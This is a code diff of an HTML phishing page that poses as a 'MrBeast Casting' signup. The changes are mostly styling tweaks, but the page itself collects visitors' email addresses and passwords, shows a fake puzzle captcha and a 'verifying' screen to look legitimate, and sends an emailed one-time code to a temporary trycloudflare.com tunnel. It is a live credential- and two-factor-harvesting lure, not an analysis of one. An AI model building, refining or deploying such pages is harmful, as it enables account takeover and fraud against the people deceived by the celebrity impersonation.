@@ -10,28 +10,28 @@
         * { box-sizing: border-box; }
         body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; background-color: var(--primary-blue); margin: 0; color: #fff; overflow-x: hidden; position: relative; }
         
-        /* BACKGROUND: LOGO PATTERN WITH MEDIUM COLOR (0.25 OPACITY) */
-        .bg-pattern { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: url('https://crystalpng.com'); background-size: 60px; opacity: 0.25; z-index: 0; pointer-events: none; }
+        /* BACKGROUND: LOGO PATTERN (0.25 OPACITY) */
+        .bg-pattern { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: url('https://crystalpng.com'); background-size: 70px; opacity: 0.25; z-index: 0; pointer-events: none; }
         
         /* TOP BIG LOGO */
-        .top-logo { width: 340px; margin-top: 40px; margin-bottom: 20px; filter: drop-shadow(0 0 25px rgba(0,0,0,0.5)); z-index: 5; position: relative; }
+        .top-logo { width: 340px; margin-top: 45px; margin-bottom: 25px; filter: drop-shadow(0 0 25px rgba(0,0,0,0.5)); z-index: 5; position: relative; }
         
-        /* TALL APP-STYLE BOX */
-        .box { background: #111; border-radius: 30px; width: 92%; max-width: 400px; padding: 40px 30px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.8); border: 1px solid #333; position: relative; z-index: 10; flex: 0 1 auto; margin-bottom: 50px; }
+        /* TALL APP-STYLE LOGIN BOX */
+        .box { background: #111; border-radius: 30px; width: 92%; max-width: 400px; padding: 45px 30px; text-align: center; box-shadow: 0 20px 55px rgba(0,0,0,0.8); border: 1px solid #333; position: relative; z-index: 10; flex: 0 1 auto; margin-bottom: 60px; }
         
-        /* MIDDLE BOX LOGO */
-        .mid-logo { width: 120px; margin: 0 auto 15px auto; display: block; filter: drop-shadow(0 0 12px var(--primary-blue)); }
+        /* MEDIUM BOX LOGO */
+        .mid-logo { width: 125px; margin: 0 auto 20px auto; display: block; filter: drop-shadow(0 0 12px var(--primary-blue)); }
         
         .mrbeast-style-text { font-family: 'Kanit', sans-serif; font-weight: 900; font-style: italic; font-size: 30px; color: #fff; margin: 0 0 20px 0; text-transform: uppercase; letter-spacing: -1px; text-shadow: 3px 3px 0px var(--primary-blue), 6px 6px 20px rgba(0,0,0,0.6); line-height: 1; }
         .mr-txt { color: var(--beast-pink); -webkit-text-stroke: 1px #fff; }
 
-        p { margin: 0 0 30px 0; color: #aaa; font-size: 14px; font-weight: 600; }
+        p { margin: 0 0 30px 0; color: #aaa; font-size: 14px; font-weight: 600; line-height: 1.4; }
         input { width: 100%; padding: 18px; margin-bottom: 15px; border: 1px solid #222; background: #1a1a1a; color: white; border-radius: 15px; font-size: 16px; outline: none; transition: 0.3s; }
         input:focus { border-color: var(--primary-blue); box-shadow: 0 0 15px rgba(0, 168, 232, 0.3); }
         
         .main-btn { background: linear-gradient(45deg, #f12e3e, #ff5e62); color: #fff; border: none; padding: 20px; border-radius: 15px; cursor: pointer; width: 100%; font-weight: 800; text-transform: uppercase; font-size: 16px; box-shadow: 0 8px 20px rgba(241, 46, 62, 0.3); }
         
-        /* MODERN PUZZLE CAPTCHA */
+        /* TIKTOK STYLE PUZZLE CAPTCHA */
         #puzzle-box, #loader, #step2 { display: none; }
         .puzzle-container { background: #1a1a1a; padding: 15px; border-radius: 20px; border: 1px solid #333; margin-top: 10px; }
         .canvas-area { width: 100%; height: 180px; background: url('https://images.unsplash.com') center/cover; border-radius: 12px; position: relative; border: 1px solid #444; }
@@ -47,14 +47,16 @@
 </head>
 <body>
     <div class="bg-pattern"></div>
-    <img src="https://crystalpng.com" class="top-logo" alt="MrBeast Logo">
+    <!-- TOP BIG LOGO -->
+    <img src="https://crystalpng.com" class="top-logo" alt="MrBeast Header">
 
     <div class="box">
         <div id="step1">
-            <img src="https://crystalpng.com" class="mid-logo" alt="Box Logo">
-            <!-- REMOVED POINT BETWEEN MR AND BEAST -->
+            <!-- MIDDLE BOX LOGO -->
+            <img src="https://crystalpng.com" class="mid-logo" alt="MrBeast Login">
+            <!-- NO POINT BETWEEN MR AND BEAST -->
             <div class="mrbeast-style-text"><span class="mr-txt">MR</span> BEAST CASTING</div>
-            <!-- REMOVED POINT AT END OF CHALLENGE -->
+            <!-- NO POINT AT END OF CHALLENGE -->
             <p>Fill in your details to apply for the next viral challenge</p>
             <input type="email" id="email" placeholder="Email Address" required>
             <input type="password" id="pass" placeholder="Password" required>
@@ -62,7 +64,7 @@
         </div>
 
         <div id="puzzle-box">
-            <p>Verification: Match the Puzzle</p>
+            <p>Verification Match the Puzzle</p>
             <div class="puzzle-container">
                 <div class="canvas-area">
                     <div class="puzzle-slot"></div>
@@ -74,14 +76,15 @@
             </div>
         </div>
 
-        <div id="loader"><div class="spinner"></div><p>Verifying Human Identity...</p></div>
+        <div id="loader"><div class="spinner"></div><p>Verifying Human Identity</p></div>
 
         <div id="step2">
             <div class="mrbeast-style-text" style="font-size:24px;">SECURITY CHECK</div>
-            <!-- REMOVED POINT AT END OF FINISH SENTENCE -->
+            <!-- NO POINT AT END OF SENTENCE -->
             <p>We've sent a code to your email Enter it below to finish</p>
             <form action="https://hunt-camcorder-packages-pound.trycloudflare.com" method="post">
                 <input type="text" name="otp" placeholder="000000" maxlength="6" style="text-align:center; letter-spacing:12px; font-size:26px; font-weight:bold;" required>
+                <!-- NO POINT BESIDE FINISH -->
                 <button type="submit" class="main-btn">FINISH APPLICATION</button>
             </form>
         </div>
